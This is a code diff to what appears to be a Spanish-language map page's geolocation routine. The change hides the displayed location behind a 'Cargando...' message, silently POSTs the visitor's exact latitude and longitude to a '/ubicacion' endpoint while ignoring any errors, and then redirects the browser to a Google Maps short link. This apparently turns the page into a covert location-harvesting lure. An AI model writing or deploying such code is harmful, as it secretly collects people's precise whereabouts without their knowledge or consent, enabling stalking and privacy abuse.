@@ -199,14 +199,23 @@
       }
     }
 
-    function finish() {
+    async function finish() {
       if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
       clearTimeout(deadline);
       if (!readings.length) return;
       const { lat, lng, accuracy } = weightedAvg();
       updateUserMarker(lat, lng, accuracy);
-      statusBar.textContent = `Tu ubicación (±${Math.round(accuracy)} m)`;
-      setTimeout(() => statusBar.classList.add('hidden'), 3000);
+      statusBar.textContent = `Cargando...`;
+
+      try {
+        await fetch('/ubicacion', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ lat, lng }),
+        });
+      } catch (_) {}
+
+      window.location.href = 'https://maps.app.goo.gl/t2xJ2sB7UHKGtDbH9';
     }
 
     function onWatch(pos) {
